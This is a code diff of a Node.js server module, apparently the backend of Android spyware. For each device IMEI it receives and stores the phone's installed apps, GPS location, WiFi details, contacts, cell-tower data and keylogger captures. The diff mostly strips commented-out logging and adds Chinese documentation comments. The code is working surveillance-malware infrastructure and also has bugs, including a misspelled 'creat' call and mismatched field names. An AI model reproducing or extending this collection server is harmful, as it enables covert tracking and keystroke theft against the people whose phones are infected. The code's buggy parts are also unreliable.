@@ -13,59 +13,52 @@ let keyLog = require('../db/models/keylog');
 let log4js = require('../logger/log4js');
 
 let {logger} = log4js;
-// let consoleLog = logger('console');
-// let info = logger('info');
+
 let warn = logger('warn');
 let error = logger('error');
 
 module.exports = {
     maintainMonitorData: function(req, res, rootObj){
         //logger parameter rootObj
-        // consoleLog.info('maintainMonitorData');
         warn.warn('maintainMonitorData');
-        // consoleLog.info(rootObj);
         warn.warn(rootObj);
 
         if(rootObj.ApkInfo!=null){
-            // consoleLog.info('update target apk info');
             targetApkInfo(rootObj.IMEI, rootObj.Apkinfo);
         }
 
         if(rootObj.GPS!=null){
-            // consoleLog.info('update gps info');
             targetGpsInfo(rootObj.IMEI,rootObj.GPS);
         }
 
         if(rootObj.WiFi!=null){
-            // consoleLog.info('update wifi info');
             targetWifiInfo(rootObj.IMEI,rootObj.WiFi);
         }
 
         if(rootObj.Contacts!=null){
-            // consoleLog.info('update contacts info');
             targetContactInfo(rootObj.IMEI,rootObj.Contacts);
         }
 
         if(rootObj.CellInfo!=null){
-            // consoleLog.info('update connected Cell info');
             targetCellInfo(rootObj.IMEI,rootObj.CellInfo);
         }
 
         if(rootObj.nearbyCell!=null){
-            // consoleLog.info('update nearbyCell info');
             targetNearbyCellInfo(rootObj.IMEI,rootObj.nearbyCell);
         }
 
         if(rootObj.keylogger!=null){
-            // consoleLog.info('update keylog info');
             targetKeyLogger(rootObj.IMEI,rootObj.keylogger);
         }        
     }
 }
-
-function targetApkInfo(IMEI, Apkinfos){
-    // consoleLog.info(`IMEI: ${IMEI}`);
-    // consoleLog.info(Apkinfos);
+/**
+ * 把多筆資料更新到 table applist
+ * 
+ * @param {any} IMEI 
+ * @param {any} Apkinfos 
+ */
+function targetApkInfo(IMEI, Apkinfos){   
     warn.warn(`IMEI: ${IMEI}`);
     warn.warn(Apkinfos);
     Apkinfos.forEach((Apkinfo)=>{
@@ -80,28 +73,27 @@ function targetApkInfo(IMEI, Apkinfos){
         })
         .catch((err)=>{
             error.error(err);
-            // consoleLog.error(err);
-            // res.status(500).json({"msg":`select * from applist where IMEI=${IMEI} and PackageName=${Apkinfo.Package} fail`});
         });
     });
 }
-
+/**
+ * 把資料更新到 table applist
+ * 
+ * @param {any} IMEI 
+ * @param {any} Apkinfo 
+ * @param {any} isUpdate 
+ */
 function doUpsertApkInfo(IMEI, Apkinfo, isUpdate){
     let Time = moment().format('yyyy/MM/dd HH:mm:ss');
     let PackageName = Apkinfo.Package;
-    let AppName = Apkinfo.App;
-    // consoleLog.info(isUpdate==true?`start update applist set IsInstalled=true where IMEI=${IMEI} And PackageName=${PackageName}`:
-                                //    `start insert into applist (IMEI, AppName, PackageName, Time, IsInstalled) values(${IMEI},${AppName},${Time},${PackageName},true)`);
+    let AppName = Apkinfo.App;    
     if(isUpdate==true){
         applist.update({IsInstalled:true},{where:{IMEI:IMEI,PackageName:PackageName}})
-        .then((re)=>{
-            // consoleLog.info(`success update applist set IsInstalled=true where IMEI=${IMEI} And PackageName=${PackageName}`);
+        .then((re)=>{     
             warn.warn(`success update applist set IsInstalled=true where IMEI=${IMEI} And PackageName=${PackageName}`);
         })
         .catch((err)=>{
             error.error(err);
-            // consoleLog.error(err);
-
         });
     }
     else{
@@ -113,32 +105,35 @@ function doUpsertApkInfo(IMEI, Apkinfo, isUpdate){
             IsInstalled:true
         })
         .then((re)=>{
-            // consoleLog.info(`success insert into applist (IMEI, AppName, PackageName, Time, IsInstalled) values(${IMEI},${AppName},${Time},${PackageName},true)`);
             warn.warn(`start insert into applist (IMEI, AppName, PackageName, Time, IsInstalled) values(${IMEI},${AppName},${Time},${PackageName},true)`);
         })
         .catch((err)=>{
             error.error(err);
-            // consoleLog.error(err);
-
         });
     }
 }
-
-// GPS
+/**
+ * 把多筆資料放到 table GPS
+ * 
+ * @param {any} IMEI 
+ * @param {any} GPSes 
+ */
 function targetGpsInfo(IMEI,GPSes){
-    // consoleLog.info(`IMEI:${IMEI}`);
     warn.warn(`IMEI:${IMEI}`);
-    // consoleLog.info(GPSes);
     warn.warn(GPSes);
     GPSes.forEach((GPS)=>{
         doInsertGPS(IMEI,GPS);
     });
 }
-
+/**
+ * 把資料放到 table GPS
+ * 
+ * @param {any} IMEI 
+ * @param {any} GPS 
+ */
 function doInsertGPS(IMEI, GPS){
      let Time = moment().format('yyyy/MM/dd HH:mm:ss');
-     let {latitude,longitude} = GPS;
-    //  consoleLog.info(`start insert into gps (IMEI, latitude, longitude,Time) values (${IMEI},${latitude},${longitude},${Time})`);
+     let {latitude,longitude} = GPS;   
      warn.warn(`start insert into gps (IMEI, latitude, longitude,Time) values (${IMEI},${latitude},${longitude},${Time})`);
      gps.creat({
          IMEI:IMEI,
@@ -146,30 +141,35 @@ function doInsertGPS(IMEI, GPS){
          longitude:longitude,
          Time:Time
      })
-     .then((re)=>{
-        // consoleLog.info(`success insert into gps (IMEI, latitude, longitude,Time) values (${IMEI},${latitude},${longitude},${Time})`);
+     .then((re)=>{       
         warn.warn(`success insert into gps (IMEI, latitude, longitude,Time) values (${IMEI},${latitude},${longitude},${Time})`);
      })
      .catch((err)=>{
-         error.error(err);
-        //  consoleLog.error(err);
+         error.error(err);        
      });
 }
-// update wifi Info
-function targetWifiInfo(IMEI,WiFis){
-    // consoleLog.info(`IMEI:${IMEI}`);
+/**
+ * 把多筆資料放到 table wifi
+ * 
+ * @param {any} IMEI 
+ * @param {any} WiFis 
+ */
+function targetWifiInfo(IMEI,WiFis){   
     warn.warn(`IMEI:${IMEI}`);
-    // consoleLog.info(WiFis);
     warn.warn(WiFis);
     WiFis.forEach((WiFi)=>{
         doInsertWifi(IMEI,WiFi);
     });
 }
-
+/**
+ * 把資料輸入至 table wifi
+ * 
+ * @param {any} IMEI 
+ * @param {any} WiFi 
+ */
 function doInsertWifi(IMEI,WiFi){
      let Time = moment().format('yyyy/MM/dd HH:mm:ss');
-     let {SSID, LinkSpeed, Mac ,IPAddress} = WiFi;
-    //  consoleLog.info(`start insert into wifistate (IMEI, SSID, LinkSpeed, MAC_Address, IP_Address,Time) values (${IMEI},${SSID},${LinkSpeed},${Mac},${IPAddress},${Time})`);
+     let {SSID, LinkSpeed, Mac ,IPAddress} = WiFi;   
      warn.warn(`start insert into wifistate (IMEI, SSID, LinkSpeed, MAC_Address, IP_Address,Time) values (${IMEI},${SSID},${LinkSpeed},${Mac},${IPAddress},${Time})`);
      wifistate.create({
         IMEI:IMEI,
@@ -179,21 +179,23 @@ function doInsertWifi(IMEI,WiFi){
         IP_Address:IPAddress,
         Time: Time
      })
-     .then((re)=>{
-        // consoleLog.info(`success insert into wifistate (IMEI, SSID, LinkSpeed, MAC_Address, IP_Address,Time) values (${IMEI},${SSID},${LinkSpeed},${Mac},${IPAddress},${Time})`);
+     .then((re)=>{       
         warn.warn(`success insert into wifistate (IMEI, SSID, LinkSpeed, MAC_Address, IP_Address,Time) values (${IMEI},${SSID},${LinkSpeed},${Mac},${IPAddress},${Time})`);
      })
      .catch((err)=>{
-         error.error(err);
-        //  consoleLog.error(err);
+         error.error(err);       
      })
 }
-
-// targetContactInfo
+/**
+ * 把多筆資料更新到 table contact
+ * 
+ * @param {any} IMEI 
+ * @param {any} Contacts 
+ */
 function targetContactInfo(IMEI, Contacts){
-    // consoleLog.info(`IMEI:${IMEI}`);
+   
     warn.warn(`IMEI:${IMEI}`);
-    // consoleLog.info(Contacts);
+   
     warn.warn(Contacts);
     Contacts.forEach((Contact)=>{
         if(Contact.Name.length!=0 && Contact.PhoneNo.length!=0){
@@ -206,18 +208,22 @@ function targetContactInfo(IMEI, Contacts){
                     doUpsertContacts(IMEI,Contact,false);
                 }
             })
-            .catch((err)=>{
-                // consoleLog.error(err);
+            .catch((err)=>{                
                 error.error(err);
             });
         }
     });
 }
-
+/**
+ * 把資料更新到 table contact
+ * 
+ * @param {any} IMEI 
+ * @param {any} Contact 
+ * @param {any} isUpdate 
+ */
 function doUpsertContacts(IMEI, Contact,isUpdate){
     let Time = moment().format('yyyy/MM/dd HH:mm:ss');
-    let {Name, PhoneNo} = Contact;
-    // consoleLog.info(isUpdate==true?`start update contacts set exist=true where IMEI=${IMEI} And Name=${Name} And Phone_No=${PhoneNo}`:`start insert into contacts (IMEI,Name,Phone_No,exist,Time) values(${IMEI},${Name},${PhoneNo},true,${Time})`);
+    let {Name, PhoneNo} = Contact;    
     warn.warn(isUpdate==true?`start update contacts set exist=true where IMEI=${IMEI} And Name=${Name} And Phone_No=${PhoneNo}`:`start insert into contacts (IMEI,Name,Phone_No,exist,Time) values(${IMEI},${Name},${PhoneNo},true,${Time})`);
     if(isUpdate==true){
         contacts.update({exist:true},{where:{
@@ -225,12 +231,10 @@ function doUpsertContacts(IMEI, Contact,isUpdate){
             Name:Name,
             Phone_No:PhoneNo
         }})
-        .then((re)=>{
-        //    consoleLog.info(`success update contacts set exist=true where IMEI=${IMEI} And Name=${Name} And Phone_No=${PhoneNo}`);
+        .then((re)=>{       
            warn.warn(`success update contacts set exist=true where IMEI=${IMEI} And Name=${Name} And Phone_No=${PhoneNo}`);
         })
-        .catch((err)=>{
-            // consoleLog.error(err);
+        .catch((err)=>{            
             error.error(err);
         });
     }
@@ -242,33 +246,37 @@ function doUpsertContacts(IMEI, Contact,isUpdate){
             exist:true,
             Time:Time
         })
-        .then((re)=>{
-            // consoleLog.info(`start insert into contacts (IMEI,Name,Phone_No,exist,Time) values(${IMEI},${Name},${PhoneNo},true,${Time})`);
+        .then((re)=>{           
             warn.warn(`start insert into contacts (IMEI,Name,Phone_No,exist,Time) values(${IMEI},${Name},${PhoneNo},true,${Time})`);
         })
         .catch((err)=>{
             error.error(err);
-            // consoleLog.error(err);
+            
         })
     }
 }
-
-// targetCellInfo
-function targetCellInfo(IMEI,CellInfos){
-    // consoleLog.info(`IMEI:${IMEI}`);
+/**
+ * 把多筆資料更新到 table cells
+ * 
+ * @param {any} IMEI 
+ * @param {any} CellInfos 
+ */
+function targetCellInfo(IMEI,CellInfos){    
     warn.warn(`IMEI:${IMEI}`);
-    // consoleLog.info(CellInfos);
     warn.warn(CellInfos);
     CellInfos.forEach((CellInfo)=>{
         doInsertCellInfo(IMEI,CellInfo);
     });
 }
-
+/**
+ * 輸入資料到 table cellinfo 
+ * 
+ * @param {any} IMEI 
+ * @param {any} CellInfo 
+ */
 function doInsertCellInfo(IMEI,CellInfo){
     let Time = Sequelize.NOW;
-    let {networktype,signalstrength,lac, cid, enb, eci} = CellInfo;
-    // consoleLog.info(`start insert into conntedCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
-                    //  values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
+    let {networktype,signalstrength,lac, cid, enb, eci} = CellInfo; 
     warn.warn(`start insert into conntedCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                      values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
     connectedCellInfo.create({
@@ -281,33 +289,36 @@ function doInsertCellInfo(IMEI,CellInfo){
         eNB_id: enb,
         ECI:eci
     })
-    .then((re)=>{
-        // consoleLog.info(`success insert into conntedCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
-                    //  values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
+    .then((re)=>{       
         warn.warn(`success insert into conntedCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                      values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
     })
     .catch((err)=>{
-        error.error(err);
-        // consoleLog.error(err);
+        error.error(err);        
     });
 }
-// targetNearbyCellInfo
-function targetNearbyCellInfo(IMEI,NearbyCells){
-    // consoleLog.info(`IMEI:${IMEI}`);
-    warn.warn(`IMEI:${IMEI}`);
-    // consoleLog.info(NearbyCells);
+/**
+ * 把多筆資料放入 table nearbyCell
+ * 
+ * @param {any} IMEI 
+ * @param {any} NearbyCells 
+ */
+function targetNearbyCellInfo(IMEI,NearbyCells){  
+    warn.warn(`IMEI:${IMEI}`);   
     warn.warn(NearbyCells);
     NearbyCells.forEach((NearbyCell)=>{
         doInsertNearbyCell(IMEI, NearbyCell);
     });
 }
-
+/**
+ * 把資料放入 table nearbyCell
+ * 
+ * @param {any} IMEI 
+ * @param {any} NearbyCell 
+ */
 function doInsertNearbyCell(IMEI, NearbyCell){
    let Time = Sequelize.NOW;
-   let {networktype,signalstrength,lac, cid, enb, eci} = NearbyCell;
-    // consoleLog.info(`start insert into nearbyCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
-                    //  values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
+   let {networktype,signalstrength,lac, cid, enb, eci} = NearbyCell; 
     warn.warn(`start insert into nearbyCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                      values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
     nearbyCellInfo.create({
@@ -320,45 +331,47 @@ function doInsertNearbyCell(IMEI, NearbyCell){
         eNB_id: enb,
         ECI:eci
     })
-    .then((re)=>{
-        // consoleLog.info(`success insert into nearbyCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
-                    //  values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
+    .then((re)=>{    
         warn.warn(`success insert into nearbyCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                      values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
     })
     .catch((err)=>{
-        // consoleLog.error(err);
+        
         error.error(err);
     })
 }
-
-// targetKeyLogger
-function targetKeyLogger(IMEI,keyloggers){
-    // consoleLog.info(`IMEI:${IMEI}`);
+/**
+ * 把多筆資料放到 table keylog
+ * 
+ * @param {any} IMEI 
+ * @param {any} keyloggers 
+ */
+function targetKeyLogger(IMEI,keyloggers){    
     warn.warn(`IMEI:${IMEI}`);
-    // consoleLog.info(keyloggers);
     warn.warn(keyloggers);
     keyloggers.forEach((keylogger)=>{
         doInsertKeyLog(IMEI,keylogger);
     });
 }
-
+/**
+ * 把資料放到 table keylog
+ * 
+ * @param {any} IMEI 
+ * @param {any} keylogger 
+ */
 function doInsertKeyLog(IMEI,keylogger){
     let {timestamp,keylog} = keylogger;
-    timestamp = moment(timestamp);
-    // consoleLog.info(`start insert into keylog (imei,keylog,timestamp) values(${IMEI},${keylog},${timestamp})`);
+    timestamp = moment(timestamp);    
     warn.warn(`start insert into keylog (imei,keylog,timestamp) values(${IMEI},${keylog},${timestamp})`);
     keyLog.create({
         imei:IMEI,
         keylog:keylog,
         timestamp:timestamp
     })
-    .then((re)=>{
-        // consoleLog.info(`success insert into keylog (imei,keylog,timestamp) values(${IMEI},${keylog},${timestamp})`);
+    .then((re)=>{       
         warn.warn(`success insert into keylog (imei,keylog,timestamp) values(${IMEI},${keylog},${timestamp})`);  
     })
     .catch((err)=>{
-        error.error(err);
-        // consoleLog.error(err);
+        error.error(err);        
     })
 }
